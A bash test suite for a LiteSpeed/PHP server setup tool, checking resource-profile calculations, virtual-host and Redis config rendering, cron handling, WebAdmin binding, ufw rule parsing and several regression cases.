D_STATIC_PATHS="/static/,/assets/"
# MSYS_NO_PATHCONV: under Git Bash, jq is a native Windows binary and MSYS rewrites any
# argument that looks like a POSIX path, so "/static/" would arrive as "C:/Program Files/...".
MSYS_NO_PATHCONV=1 lib_domain_state_json >"$STATE_DIR/domains/app.example.com/domain.json"
lib_domain_state_load app.example.com
assert_eq "a real list still round-trips" "/static/,/assets/" "$D_STATIC_PATHS"
rm -rf "$STATE_DIR/domains/app.example.com"
lib_domain_state_reset

# -- settings chosen at install time are restored for later commands ---------
# without this "panel" rebound the WebAdmin listener to the built-in 7080
lib_manifest_set '.params.admin_port' '7574'
lib_manifest_set '.params.admin_access' 'ip'
ADMIN_PORT="7080"; ADMIN_ACCESS="tunnel"
lib_params_load
assert_eq "admin port restored from the manifest" "7574" "$ADMIN_PORT"
assert_eq "admin access restored too" "ip" "$ADMIN_ACCESS"
ADMIN_PORT="7080"; ADMIN_ACCESS="tunnel"
lib_manifest_set '.params.admin_port' ''
lib_manifest_set '.params.admin_access' ''
cp "$TMP/conf.before-audit" "$LSWS_CONF"

# =============================================================================
section "profile calculation"
SYS_ANALYZED=1; SYS_RAM_MB=4096; SYS_RAM_AVAIL_MB=3000; SYS_CPU_CORES=2; SYS_DISK_TYPE=ssd; SYS_SWAP_MB=0
lib_system_profile
assert_eq "db buffer pct 4G" 40 "$CALC_DB_BUFFER_PCT"
assert_eq "db buffer mb" 1632 "$CALC_DB_BUFFER_MB"
assert_eq "db log mb" 408 "$CALC_DB_LOG_MB"
assert_eq "db max conn" 256 "$CALC_DB_MAX_CONN"
assert_eq "db io cap ssd" 1000 "$CALC_DB_IO_CAP"
assert_eq "redis mb" 327 "$CALC_REDIS_MB"
assert_eq "php memory" 256 "$CALC_PHP_MEMORY_MB"
assert_eq "opcache" 192 "$CALC_OPCACHE_MB"
assert_eq "ols workers" 2 "$CALC_OLS_WORKERS"
assert_eq "ols max conn" 5000 "$CALC_OLS_MAX_CONN"
assert_eq "no swap needed at 4G" 0 "$CALC_SWAP_MB"
assert_true "php children sane" bash -c "(( $CALC_PHP_CHILDREN_SITE >= 2 && $CALC_PHP_CHILDREN_SITE <= 8 && $CALC_PHP_CHILDREN_TOTAL >= $CALC_PHP_CHILDREN_SITE ))"
SYS_RAM_MB=1024; SYS_DISK_TYPE=nvme; lib_system_profile
assert_eq "db buffer pct 1G" 25 "$CALC_DB_BUFFER_PCT"
assert_eq "swap 1G" 2048 "$CALC_SWAP_MB"
assert_eq "io cap nvme" 2000 "$CALC_DB_IO_CAP"
assert_eq "redis min 64" 64 "$CALC_REDIS_MB"
SYS_RAM_MB=512; lib_system_profile; assert_eq "swap 512M" 1024 "$CALC_SWAP_MB"
DB_BUFFER_PERCENT=60; SYS_RAM_MB=8192; lib_system_profile
assert_eq "db pct override" 60 "$CALC_DB_BUFFER_PCT"; assert_eq "db mb override" 4912 "$CALC_DB_BUFFER_MB"
DB_BUFFER_PERCENT=""; SYS_RAM_MB=4096; SYS_DISK_TYPE=ssd; lib_system_profile
out="$(lib_db_render_tuning)"
assert_has "tuning buffer pool" "innodb_buffer_pool_size         = 1632M" "$out"
assert_has "tuning max conn" "max_connections                 = 256" "$out"
assert_has "tuning bind" "bind-address                    = 127.0.0.1" "$out"
out="$(lib_php_render_ini)"
assert_has "php ini memory" "memory_limit = 256M" "$out"
assert_has "php ini opcache" "opcache.memory_consumption = 192" "$out"
assert_has "php ini tz" "date.timezone = Europe/Istanbul" "$out"
out="$(lib_redis_render_conf secretpass 0)"
assert_has "redis pass" "requirepass secretpass" "$out"
assert_has "redis maxmemory" "maxmemory 327mb" "$out"
assert_has "redis no persistence" 'save ""' "$out"
out="$(lib_redis_render_conf secretpass 1)"
assert_has "redis persistence" "appendonly yes" "$out"
out="$(lib_system_render_sysctl)"; assert_has "sysctl header" "Managed by lompstack" "$out"
out="$(lib_system_render_limits)"; assert_has "limits nofile" "nofile  1048576" "$out"

# =============================================================================
section "vhost templates"
lib_domain_state_reset
D_DOMAIN="example.com"; D_IDENT="example_com"; D_USER="example_com"; D_GROUP="example_com"; D_HOME="$SITES_ROOT/example.com"
D_MODE="php"; D_PHP="8.3"; D_PHP_CHILDREN=4; D_MEMORY="256M"; D_UPLOAD="64M"; D_WWW=1; D_SSL=1; D_HSTS_PRELOAD=0; D_EMAIL="a@example.com"
out="$(lib_ols_render_vhconf)"; printf '%s\n' "$out" >"$TMP/php.vhconf"
assert_true "php vhconf balanced" _ols_braces_balanced "$TMP/php.vhconf"
assert_has "php extprocessor" "extprocessor example_com {" "$out"
assert_has "php extUser" "extUser                 example_com" "$out"
assert_has "php post size" "post_max_size 72M" "$out"
assert_has "php sessions path" "session.save_path $SITES_ROOT/example.com/private/sessions" "$out"
assert_has "www alias" "vhAliases                 www.example.com" "$out"
assert_has "www redirect" 'RewriteCond %{HTTP_HOST} ^www\.example\.com$ [NC]' "$out"
assert_has "https redirect" 'RewriteRule ^(.*)$ https://%{HTTP_HOST}$1 [R=301,L]' "$out"
assert_has "hsts" "Strict-Transport-Security: max-age=31536000; includeSubDomains" "$out"
assert_lacks "no preload" "preload" "$out"
assert_has "vhssl" "vhssl  {" "$out"
assert_has "vhssl key" "keyFile                 $SSL_DEPLOY_DIR/example.com/privkey.pem" "$out"
assert_has "dotfile block" 'RewriteRule ^/?\.(?!well-known/) - [F,L]' "$out"
assert_has "acme context" "context /.well-known/acme-challenge/ {" "$out"
assert_eq "rewrite heredoc terminated" "1" "$(grep -c '^  END_rules$' "$TMP/php.vhconf")"
assert_eq "extraHeaders heredoc terminated" "1" "$(grep -c '^  END_extraHeaders$' "$TMP/php.vhconf")"
D_SSL=0; D_WWW=0; D_MODE="static"
out="$(lib_ols_render_vhconf)"; printf '%s\n' "$out" >"$TMP/static.vhconf"
assert_true "static vhconf balanced" _ols_braces_balanced "$TMP/static.vhconf"
assert_lacks "static no scripthandler" "scripthandler" "$out"
assert_lacks "static no vhssl" "vhssl" "$out"
assert_lacks "static no https redirect" "https://%{HTTP_HOST}" "$out"
D_MODE="proxy"; D_PROXY="127.0.0.1:3000"; D_WS_PATH="/socket.io"
out="$(lib_ols_render_vhconf)"; printf '%s\n' "$out" >"$TMP/proxy.vhconf"
assert_true "proxy vhconf balanced" _ols_braces_balanced "$TMP/proxy.vhconf"
assert_has "proxy extprocessor" "extprocessor example_com_proxy {" "$out"
assert_has "proxy context" "handler                 example_com_proxy" "$out"
assert_has "proxy static ctx" "context /static/ {" "$out"
assert_has   "websocket on the proxied root" "websocket / {" "$out"
assert_lacks "no websocket context of its own (OLS would make it static)" "websocket /socket.io" "$out"
assert_has   "proxy pool closes before the app's keep-alive does" "pcKeepAliveTimeout      1" "$out"
assert_lacks "no 60 s proxy pool" "pcKeepAliveTimeout      60" "$out"
D_WS_PATH=""
out="$(lib_ols_render_vhconf)"
assert_has   "websockets pass without --ws-path too" "websocket / {" "$out"
D_WS_PATH="/socket.io"
D_MODE="wordpress"; D_PHP="8.3"
out="$(lib_ols_render_vhconf)"; printf '%s\n' "$out" >"$TMP/wp.vhconf"
assert_true "wp vhconf balanced" _ols_braces_balanced "$TMP/wp.vhconf"
assert_has "wp cache module" "module cache {" "$out"
assert_has "wp htaccess" "autoLoadHtaccess        1" "$out"
# OpenLiteSpeed ignores the "Deny from all" security plugins put into wp-content/uploads
assert_has "wp: no PHP runs from the uploads" 'RewriteRule (?i)^/?wp-content/uploads/.*\.(php[0-9]?|phtml|phar)(/|$) - [F,L]' "$out"
assert_lacks "php sites get no WordPress paths" "wp-content/uploads" "$(cat "$TMP/php.vhconf")"
lib_ols_render_default_vhconf >"$TMP/default.vhconf"
assert_true "default vhconf balanced" _ols_braces_balanced "$TMP/default.vhconf"
lib_ols_render_vhost_block example.com 1 >"$TMP/vhblock.conf"
assert_true "vhost block balanced" _ols_braces_balanced "$TMP/vhblock.conf"
assert_has "vhost block root" "vhRoot                  $SITES_ROOT/example.com/" "$(cat "$TMP/vhblock.conf")"
lib_ssl_hook_render >"$TMP/hook.sh"
assert_true "deploy hook parses" bash -n "$TMP/hook.sh"

# =============================================================================
section "state / manifest / cron / files"
lib_state_init
assert_true "manifest valid" lib_json_valid "$STATE_DIR/manifest.json"
lib_manifest_set '.params.timezone' 'Europe/Istanbul'
assert_eq "manifest get" "Europe/Istanbul" "$(lib_manifest_get '.params.timezone')"
lib_manifest_set_json '.cloudflare.enabled' true
assert_eq "manifest json bool" "true" "$(lib_manifest_get '.cloudflare.enabled')"
assert_true "cf enabled helper" lib_cf_enabled
lib_domain_state_reset
D_DOMAIN="example.com"; D_IDENT="example_com"; D_USER="example_com"; D_GROUP="example_com"; D_HOME="$SITES_ROOT/example.com"
D_MODE="php"; D_PHP="8.3"; D_PHP_CHILDREN=4; D_MEMORY="256M"; D_UPLOAD="64M"; D_WWW=1; D_SSL_WANTED=1; D_STATUS="active"; D_CREATED="2025-01-01T00:00:00Z"
lib_domain_state_save
assert_true "domain registered" lib_domain_registered example.com
lib_json_set "$(lib_domain_json example.com)" '.db = {name:"example_com", user:"example_com"}'
lib_domain_state_reset
assert_true "state load" lib_domain_state_load example.com
assert_eq "state php" "8.3" "$D_PHP"; assert_eq "state www" "1" "$D_WWW"; assert_eq "state ssl" "0" "$D_SSL"
assert_eq "state db merged" "example_com" "$D_DB_NAME"; assert_eq "state memory" "256M" "$D_MEMORY"
D_SSL=1; lib_domain_state_save; lib_domain_state_load example.com
assert_eq "state ssl saved" "1" "$D_SSL"; assert_eq "state db kept after save" "example_com" "$D_DB_NAME"
assert_eq "domains list" "example.com" "$(lib_domains_list)"
lib_cron_set healthcheck "15 6 * * * root $BIN_LINK healthcheck"
assert_true "cron has" lib_cron_has healthcheck
assert_has "cron shell header" "SHELL=/bin/bash" "$(cat "$CRON_FILE")"
lib_cron_set healthcheck "30 6 * * * root $BIN_LINK healthcheck"
assert_eq "cron replaced" "1" "$(grep -c 'server-setup:healthcheck' "$CRON_FILE")"
assert_has "cron new schedule" "30 6 * * *" "$(cat "$CRON_FILE")"
lib_cron_set "wpcron:example.com" "*/5 * * * * example_com true"
lib_cron_remove healthcheck
assert_false "cron removed" lib_cron_has healthcheck
assert_true "cron other kept" lib_cron_has "wpcron:example.com"
lib_cron_set a1 "1 * * * * root true"; lib_cron_set a2 "2 * * * * root true"; lib_cron_set a3 "3 * * * * root true"
lib_cron_set a2 "22 * * * * root true"
assert_eq  "cron: an entry is replaced where it stands" "a1 a2 a3" "$(grep -oE 'server-setup:a[0-9]$' "$CRON_FILE" | cut -d: -f2 | paste -sd' ' -)"
assert_has "cron: with its new schedule" "22 * * * * root true # server-setup:a2" "$(cat "$CRON_FILE")"
lib_cron_set a2 "22 * * * * root true"
assert_eq  "cron: setting it to what it is writes nothing" 0 "$LIB_FILE_CHANGED"
lib_cron_set a4 "4 * * * * root printf 'a\\b'"
assert_eq  "cron: a new entry goes last, backslashes as written" "4 * * * * root printf 'a\\b' # server-setup:a4" "$(tail -n 1 "$CRON_FILE")"
printf '9 * * * * root dup # server-setup:a1\n' >>"$CRON_FILE"
lib_cron_set xa1 "5 * * * * root other"
lib_cron_set a1 "11 * * * * root true"
assert_eq  "cron: a duplicate collapses into the first" 1 "$(grep -c 'server-setup:a1$' "$CRON_FILE")"
assert_has "cron: an id that only ends like another is left alone" "5 * * * * root other # server-setup:xa1" "$(cat "$CRON_FILE")"
for _c in a1 a2 a3 a4 xa1; do lib_cron_remove "$_c"; done
lib_backup_schedule "daily 03:00"
assert_has "schedule daily" "0 3 * * * root $BIN_LINK backup --all" "$(cat "$CRON_FILE")"
lib_backup_schedule "weekly sun 04:30"
assert_has "schedule weekly" "30 4 * * 0 root" "$(cat "$CRON_FILE")"
lib_backup_schedule "hourly"; assert_has "schedule hourly" "7 * * * * root" "$(cat "$CRON_FILE")"
lib_backup_schedule "15 2 * * *"; assert_has "schedule raw" "15 2 * * * root" "$(cat "$CRON_FILE")"
assert_false "schedule invalid" bash -c "$(declare -f lib_backup_schedule lib_die lib_log_write lib_mask_secrets lib_rollback_run lib_log_line_no lib_cron_set lib_manifest_set lib_ok); lib_backup_schedule bogus 2>/dev/null"
printf 'hello\n' | lib_write_file "$TMP/wf.txt"
assert_eq "write new" 1 "$LIB_FILE_CHANGED"; assert_eq "write content" "hello" "$(cat "$TMP/wf.txt")"
printf 'hello\n' | lib_write_file "$TMP/wf.txt"
assert_eq "write unchanged" 0 "$LIB_FILE_CHANGED"
printf 'world\n' | lib_write_file "$TMP/wf.txt"
assert_eq "write changed" 1 "$LIB_FILE_CHANGED"; assert_eq "write content 2" "world" "$(cat "$TMP/wf.txt")"
assert_true "backup archived" bash -c "ls '$STATE_DIR'/archive/configs/*wf.txt* >/dev/null 2>&1"
OPT_DRY_RUN=1; printf 'dry\n' | lib_write_file "$TMP/wf.txt"; OPT_DRY_RUN=0
assert_eq "dry-run flagged" 1 "$LIB_FILE_CHANGED"; assert_eq "dry-run untouched" "world" "$(cat "$TMP/wf.txt")"
printf 'a = 1\n;b = 2\n' >"$TMP/kv.ini"
lib_set_kv "$TMP/kv.ini" a 5; lib_set_kv "$TMP/kv.ini" b 7; lib_set_kv "$TMP/kv.ini" c 9
assert_eq "set_kv result" "$(printf 'a = 5\nb = 7\nc = 9')" "$(cat "$TMP/kv.ini")"
lib_append_line_once "$TMP/kv.ini" "include x"; lib_append_line_once "$TMP/kv.ini" "include x"
assert_eq "append once" 1 "$(grep -c '^include x$' "$TMP/kv.ini")"
_ini_set "$TMP/nd.conf" web "bind to" "127.0.0.1"; _ini_set "$TMP/nd.conf" web "bind to" "*"; _ini_set "$TMP/nd.conf" web "allow connections from" "localhost"
assert_eq "ini set" "$(printf '[web]\n    bind to = *\n    allow connections from = localhost')" "$(cat "$TMP/nd.conf")"
lib_domain_logrotate_regen
assert_has "logrotate site path" "$SITES_LOG_ROOT/example.com/*.log" "$(cat "$LOGROTATE_SITES_FILE")"
assert_lacks "and nothing in the site's home" "$SITES_ROOT/example.com/logs" "$(cat "$LOGROTATE_SITES_FILE")"
assert_has "logrotate copytruncate" "copytruncate" "$(cat "$LOGROTATE_SITES_FILE")"
mkdir -p "$TMP/f2b"; mv_filter_dir="$TMP/f2b"
lib_domain_fail2ban_filters_write 2>/dev/null || true

# =============================================================================
section "cloudflare access control"
printf '# cf\n173.245.48.0/20\n103.21.244.0/22\n2400:cb00::/32\n' >"$CF_IPS_FILE"
lib_ols_tx_begin; lib_cf_tx_apply 1
assert_eq "cf useIpInProxyHeader" "2" "$(lib_ols_tx_top_get useIpInProxyHeader)"
assert_eq "cf allow list" "ALL, 173.245.48.0/20T, 103.21.244.0/22T, 2400:cb00::/32T" "$(lib_ols_tx_block_get accessControl "" allow)"
lib_cf_tx_apply 0
assert_eq "cf disabled header" "0" "$(lib_ols_tx_top_get useIpInProxyHeader)"
assert_eq "cf disabled allow" "ALL" "$(lib_ols_tx_block_get accessControl "" allow)"
lib_ols_tx_abort
if command -v python3 >/dev/null 2>&1; then
  assert_true  "ip in cf range" lib_ip_in_cidr_list 173.245.50.1 "$CF_IPS_FILE"
  assert_false "ip not in cf range" lib_ip_in_cidr_list 8.8.8.8 "$CF_IPS_FILE"
  assert_true  "ipv6 in cf range" lib_ip_in_cidr_list 2400:cb00::1 "$CF_IPS_FILE"
fi

# =============================================================================
section "add argument parsing"
lib_domain_parse_add_args Example.COM --www --php 8.3 --memory 512M --upload 128M --email a@b.c
assert_eq "parse domain lower" "example.com" "$D_DOMAIN"; assert_eq "parse www" 1 "$D_WWW"; assert_eq "parse memory" "512M" "$D_MEMORY"
assert_eq "parse ident" "example_com" "$D_IDENT"; assert_eq "parse home" "$SITES_ROOT/example.com" "$D_HOME"
lib_domain_parse_add_args app.example.com --proxy 127.0.0.1:3000 --ws-path /ws --no-ssl
assert_eq "parse proxy mode" "proxy" "$D_MODE"; assert_eq "parse proxy target" "127.0.0.1:3000" "$D_PROXY"; assert_eq "parse no-ssl" 0 "$D_SSL_WANTED"; assert_eq "parse proxy php cleared" "" "$D_PHP"
lib_domain_parse_add_args blog.example.com --wordpress --wp-locale tr_TR
assert_eq "parse wp mode" "wordpress" "$D_MODE"; assert_eq "parse wp db" 1 "$DOM_OPT_WITH_DB"; assert_eq "parse wp locale" "tr_TR" "$DOM_OPT_WP_LOCALE"
PARSE_FNS="$(declare -f lib_domain_parse_add_args lib_domain_state_reset lib_domain_valid lib_domain_add_usage lib_die lib_log_write lib_mask_secrets lib_rollback_run lib_log_line_no lib_php_valid_version lib_domain_ident lib_domain_home lib_iso_now)"
assert_false "parse bad memory" bash -c "${PARSE_FNS}; DEFAULT_EMAIL=; PHP_VERSION=8.3; SITES_ROOT=/home; STATE_DIR=/tmp; lib_domain_parse_add_args x.com --memory 256 2>/dev/null"
assert_false "parse www domain" bash -c "${PARSE_FNS}; DEFAULT_EMAIL=; PHP_VERSION=8.3; SITES_ROOT=/home; STATE_DIR=/tmp; lib_domain_parse_add_args www.x.com 2>/dev/null"
assert_true  "parse ok in subshell" bash -c "${PARSE_FNS}; DEFAULT_EMAIL=; PHP_VERSION=8.3; SITES_ROOT=/home; STATE_DIR=/tmp; lib_domain_parse_add_args ok.example.com --static 2>/dev/null"

# =============================================================================
section "WebAdmin access modes"
mkdir -p "$LSWS_HOME/admin/conf"
cat >"$LSWS_ADMIN_CONF" <<'EOF'
enableCoreDump      1
sessionTimeout      3600

accessControl {
  allow             ALL
}

listener adminListener {
  address           *:7080
  secure            0
}
EOF
SYS_IPV6=0
ADMIN_ACCESS="tunnel"; assert_eq "tunnel binds localhost" "127.0.0.1" "$(lib_ols_admin_address)"
ADMIN_ACCESS="ip";     assert_eq "ip mode binds all (v4)" "*" "$(lib_ols_admin_address)"
ADMIN_ACCESS="open";   assert_eq "open mode binds all" "*" "$(lib_ols_admin_address)"
SYS_IPV6=1; assert_eq "dual stack binds [ANY]" "[ANY]" "$(lib_ols_admin_address)"
SYS_IPV6=0; ADMIN_ACCESS="tunnel"
assert_eq "current bind read" "*:7080" "$(lib_ols_admin_current_bind)"
assert_false "not tunnel-only yet" lib_ols_admin_tunnel_only
lib_ols_admin_bind 127.0.0.1
assert_eq "bind rewritten" "127.0.0.1:7080" "$(lib_ols_admin_current_bind)"
assert_true  "tunnel-only detected" lib_ols_admin_tunnel_only
assert_eq "admin URL uses localhost" "http://127.0.0.1:7080" "$(lib_ols_admin_url)"
lib_ols_admin_bind 127.0.0.1
assert_eq "rebinding is idempotent" 0 "$LIB_FILE_CHANGED"
lib_ols_admin_bind '*'
assert_eq "bind back to all" "*:7080" "$(lib_ols_admin_current_bind)"
assert_false "no longer tunnel-only" lib_ols_admin_tunnel_only
assert_eq "admin conf still balanced" 1 "$( _ols_braces_balanced "$LSWS_ADMIN_CONF" && echo 1 || echo 0)"
assert_eq "secure flag untouched" "0" "$(_ols_block_key "$LSWS_ADMIN_CONF" listener adminListener secure get)"

SYS_SSH_PORTS="22"; SYS_PUBLIC_IPV4="198.51.100.7"; SUDO_USER="deploy"
assert_eq "tunnel command (default port)" "ssh -N -L 7080:127.0.0.1:7080 deploy@198.51.100.7" "$(lib_ols_admin_tunnel_cmd)"
SYS_SSH_PORTS="2222 22"
assert_eq "tunnel command (custom port)" "ssh -N -L 7080:127.0.0.1:7080 -p 2222 deploy@198.51.100.7" "$(lib_ols_admin_tunnel_cmd)"
unset SUDO_USER

SSH_CONNECTION="203.0.113.9 51234 10.0.0.5 22"
assert_eq "admin client ip from SSH" "203.0.113.9" "$(lib_admin_client_ip)"
SSH_CONNECTION="2001:db8::1 51234 2001:db8::2 22"
assert_eq "admin client ipv6 from SSH" "2001:db8::1" "$(lib_admin_client_ip)"
unset SSH_CONNECTION
# sudo clears the environment, so the fallbacks decide; each part is tested on its own
# because the ancestry walk depends on the machine the suite runs on.
assert_eq "who: remote IPv4"  "203.0.113.77" "$(lib_admin_ip_from_who <<<'root     pts/0        2026-09-14 17:30 (203.0.113.77)')"
assert_eq "who: remote IPv6"  "2001:db8::1"  "$(lib_admin_ip_from_who <<<'ubuntu   pts/1        2026-09-14 17:30 (2001:db8::1)')"
assert_eq "who: local console" ""            "$(lib_admin_ip_from_who <<<'root     tty1         2026-09-14 17:30')"
assert_eq "who: X display"     ":0"          "$(lib_admin_ip_from_who <<<'root     pts/0        2026-09-14 17:30 (:0)')"
assert_eq "who: no output"     ""            "$(lib_admin_ip_from_who </dev/null)"
assert_true  "valid IPv4 accepted" lib_admin_ip_valid 203.0.113.77
assert_true  "valid IPv6 accepted" lib_admin_ip_valid 2001:db8::1
assert_false "X display rejected"  lib_admin_ip_valid ':0'
assert_false "hostname rejected"   lib_admin_ip_valid 'client.example.com'
assert_false "empty rejected"      lib_admin_ip_valid ''
assert_eq "ancestry walk exits cleanly" 0 "$(run_isolated lib_admin_ip_from_ancestors)"

# ufw rule parsing must never touch a port it was not asked about
ufw() {
  [[ "$*" == "status numbered" ]] || return 0
  cat <<'EOF'
Status: active

     To                         Action      From
     --                         ------      ----
[ 1] 22/tcp                     ALLOW IN    Anywhere
[ 2] 80/tcp                     ALLOW IN    Anywhere
[ 3] 7080/tcp                   ALLOW IN    203.0.113.5
[ 4] 443/tcp                    ALLOW IN    Anywhere
[10] 7080/tcp (v6)              ALLOW IN    Anywhere (v6)
EOF
}
assert_eq "admin port rules, highest first" "$(printf '10\n3')" "$(lib_ufw_port_rule_numbers 7080)"
assert_eq "ssh port rule found" "1" "$(lib_ufw_port_rule_numbers 22)"
assert_eq "unused port has no rules" "" "$(lib_ufw_port_rule_numbers 9999)"
assert_lacks "port 80 never matched for 7080" "2" "$(lib_ufw_port_rule_numbers 7080)"
unset -f ufw

# =============================================================================
section "config test (structural)"
lib_ols_tx_begin; lib_ols_tx_vhost_add example.com 1 1; lib_ols_tx_commit
assert_eq "vhost map http" "example.com, www.example.com" "$(lib_ols_conf_map_get HTTP example.com)"
assert_false "config test fails on missing vhconf" lib_ols_config_test
assert_has "config test message" "configFile" "$OLS_TEST_OUTPUT"
mkdir -p "$LSWS_VHOSTS_DIR/example.com"; cp "$TMP/php.vhconf" "$LSWS_VHOSTS_DIR/example.com/vhconf.conf"
assert_true "config test passes" lib_ols_config_test
lib_ols_tx_begin; lib_ols_tx_vhost_remove example.com; lib_ols_tx_commit
assert_false "vhost removed from conf" lib_ols_conf_block_exists virtualhost example.com
assert_eq "maps removed" "" "$(lib_ols_conf_map_get HTTPS example.com)"

# =============================================================================
section "php.ini discovery (regression: SIGPIPE from a large phpinfo)"
mkdir -p "$TMP/fakephp/bin"
cat >"$TMP/fakephp/bin/php" <<'FAKEPHP'
#!/usr/bin/env bash
# stand-in for the LSPHP CLI; --ini is short, -i is deliberately huge
case "${1:-}" in
  --ini)
    [[ "${FAKE_NO_INI_FLAG:-0}" == "1" ]] && exit 0
    printf 'Configuration File (php.ini) Path: /fake/etc\n'
    printf 'Loaded Configuration File:         %s\n' "${FAKE_INI:-/fake/etc/php.ini}"
    printf 'Scan for additional .ini files in: %s\n' "${FAKE_SCAN:-/fake/etc/conf.d}"
    printf 'Additional .ini files parsed:      (none)\n'
    ;;
  -i)
    printf 'Loaded Configuration File => %s\n' "${FAKE_INI:-/fake/etc/php.ini}"
    printf 'Scan this dir for additional .ini files => %s\n' "${FAKE_SCAN:-/fake/etc/conf.d}"
    i=0
    while (( i < 20000 )); do
      printf 'filler %s ..........................................................\n' "$i" || exit 255
      i=$(( i + 1 ))
    done
    ;;
esac
FAKEPHP
chmod +x "$TMP/fakephp/bin/php"
lib_php_cli() { printf '%s/bin/php' "$TMP/fakephp"; }
assert_eq "ini discovery exits 0 (--ini path)" 0 "$(run_isolated lib_php_ini_paths 8.3)"
lib_php_ini_paths 8.3
assert_eq "php.ini parsed from --ini" "/fake/etc/php.ini" "$PHP_INI_FILE"
assert_eq "scan dir parsed from --ini" "/fake/etc/conf.d" "$PHP_INI_SCAN_DIR"
export FAKE_NO_INI_FLAG=1
assert_eq "ini discovery exits 0 (huge -i fallback)" 0 "$(run_isolated lib_php_ini_paths 8.3)"
lib_php_ini_paths 8.3
assert_eq "php.ini parsed from -i" "/fake/etc/php.ini" "$PHP_INI_FILE"
assert_eq "scan dir parsed from -i" "/fake/etc/conf.d" "$PHP_INI_SCAN_DIR"
unset FAKE_NO_INI_FLAG
export FAKE_SCAN="(none)"
lib_php_ini_paths 8.3
assert_eq "(none) scan dir becomes empty" "" "$PHP_INI_SCAN_DIR"
unset FAKE_SCAN
lib_php_cli() { printf '%s/bin/php' "$TMP/does-not-exist"; }
assert_eq "missing CLI exits 0" 0 "$(run_isolated lib_php_ini_paths 8.3)"
# shellcheck source=/dev/null
source "$ROOT/lib/php.sh"

# =============================================================================
section "renderers must exit 0 (pipefail safety)"
# Every renderer is used as "renderer | lib_write_file". If a renderer's last statement is a
# conditional that turns out false, the renderer exits 1 and pipefail aborts the installer.
# These run with errexit explicitly re-armed, which is how the installer executes them.
for fn in lib_system_render_sysctl lib_system_render_limits lib_db_render_tuning \
          lib_php_render_ini lib_ols_render_default_vhconf lib_ols_render_default_vhost_block \
          lib_ssl_hook_render lib_ols_admin_address; do
  assert_eq "${fn} exits 0" 0 "$(run_isolated "$fn")"
done
assert_eq "lib_ols_render_extprocessor exits 0" 0 "$(run_isolated lib_ols_render_extprocessor 8.3 4)"
assert_eq "lib_ols_render_vhost_block exits 0" 0 "$(run_isolated lib_ols_render_vhost_block example.com 1)"
assert_eq "lib_redis_render_conf (cache) exits 0" 0 "$(run_isolated lib_redis_render_conf pw 0)"
assert_eq "lib_redis_render_conf (persist) exits 0" 0 "$(run_isolated lib_redis_render_conf pw 1)"
assert_eq "lib_ols_render_vhssl exits 0" 0 "$(run_isolated lib_ols_render_vhssl /k.pem /c.pem 1)"

# the site renderer has the most branches: cover every mode with and without TLS
for _mode in php static proxy wordpress; do
  for _ssl in 0 1; do
    lib_domain_state_reset
    D_DOMAIN="example.com"; D_IDENT="example_com"; D_USER="example_com"; D_GROUP="example_com"
    D_HOME="$SITES_ROOT/example.com"; D_MODE="$_mode"; D_SSL="$_ssl"
    [[ "$_mode" == "proxy" ]] && D_PROXY="127.0.0.1:3000"
    [[ "$_mode" == "php" || "$_mode" == "wordpress" ]] && { D_PHP="8.3"; D_MEMORY="256M"; D_UPLOAD="64M"; D_PHP_CHILDREN=4; }
    assert_eq "vhconf ${_mode} ssl=${_ssl} exits 0" 0 "$(run_isolated lib_ols_render_vhconf)"
    # and with every optional switch on at once
    D_WWW=1; D_WWW_PRIMARY=1; D_HSTS_PRELOAD=1; D_EMAIL="a@b.c"; D_WS_PATH="/ws"; D_PATH_PROXIES=$'/api/ 127.0.0.1:3001\n/ws/ 127.0.0.1:3002'
    assert_eq "vhconf ${_mode} ssl=${_ssl} (all options) exits 0" 0 "$(run_isolated lib_ols_render_vhconf)"
  done
done
lib_domain_state_reset

# =============================================================================
section "every configured path is created (regression: path is not accessible)"
# OpenLiteSpeed refuses the whole configuration when a context points at a directory that
# does not exist. This walks the rendered configuration, resolves the OLS variables and
# asserts the installer really creates every path it references.
ACME_ROOT="$TMP/acme"; OLS_CACHE_DIR="$TMP/cachedata"; OLS_DEFAULT_ROOT="$TMP/lsws/_default"
config_paths() { awk '$1=="location" || $1=="docRoot" || $1=="storagePath" {print $2}'; }

lib_ols_acme_root_ensure
lib_mkdir "${OLS_DEFAULT_ROOT}/html" 0755
missing=""
while read -r p; do
  [[ -n "$p" ]] || continue
  p="${p//'$VH_ROOT'/$OLS_DEFAULT_ROOT}"
  [[ -e "$p" ]] || missing+="${p} "
done < <(lib_ols_render_default_vhconf | config_paths)
assert_eq "catch-all vhost: every path exists" "" "$missing"

for _mode in php static proxy wordpress; do
  lib_domain_state_reset
  D_DOMAIN="paths-${_mode}.example.com"; D_IDENT="paths_${_mode}"
  D_USER="paths_user"; D_GROUP="paths_user"   # chown is stubbed out in this suite
  D_HOME="$SITES_ROOT/${D_DOMAIN}"; D_MODE="$_mode"
  [[ "$_mode" == "proxy" ]] && D_PROXY="127.0.0.1:3000"
  [[ "$_mode" == "php" || "$_mode" == "wordpress" ]] && { D_PHP="8.3"; D_MEMORY="256M"; D_UPLOAD="64M"; D_PHP_CHILDREN=4; }
  lib_domain_dirs_create >/dev/null 2>&1
  missing=""
  while read -r p; do
    [[ -n "$p" ]] || continue
    p="${p//'$VH_ROOT'/$D_HOME}"
    p="${p//'$VH_NAME'/$D_DOMAIN}"
    [[ -e "$p" ]] || missing+="${p} "
  done < <(lib_ols_render_vhconf | config_paths)
  assert_eq "${_mode} site: every path exists" "" "$missing"
done
assert_true "proxy static dir created" test -d "${SITES_ROOT}/paths-proxy.example.com/public_html/static"
assert_true "proxy app dir created" test -d "${SITES_ROOT}/paths-proxy.example.com/app"
assert_true "wordpress cache dir created" test -d "${OLS_CACHE_DIR}/paths-wordpress.example.com"
assert_true "acme webroot created" test -d "${ACME_ROOT}/.well-known/acme-challenge"
lib_domain_state_reset

# =============================================================================
section "HTTP status helper (regression: 000000)"
# curl prints 000 itself on a connection failure and then exits non-zero, so appending a
# fallback produced "000000"; callers compared that against "000" and saw a healthy server.
curl() {
  case "${FAKE_CURL:-ok}" in
    ok)   printf '200' ;;
    fail) printf '000'; return 7 ;;
    empty) return 7 ;;
  esac
}
FAKE_CURL=ok;    assert_eq "successful request" "200" "$(lib_http_code http://127.0.0.1/)"
FAKE_CURL=fail;  assert_eq "connection refused is exactly 000" "000" "$(lib_http_code http://127.0.0.1/)"
FAKE_CURL=empty; assert_eq "no output at all is 000" "000" "$(lib_http_code http://127.0.0.1/)"
FAKE_CURL=fail;  assert_true "failure is detected as 000" bash -c "[[ '$(lib_http_code http://127.0.0.1/)' == '000' ]]"
unset -f curl; unset FAKE_CURL

# =============================================================================
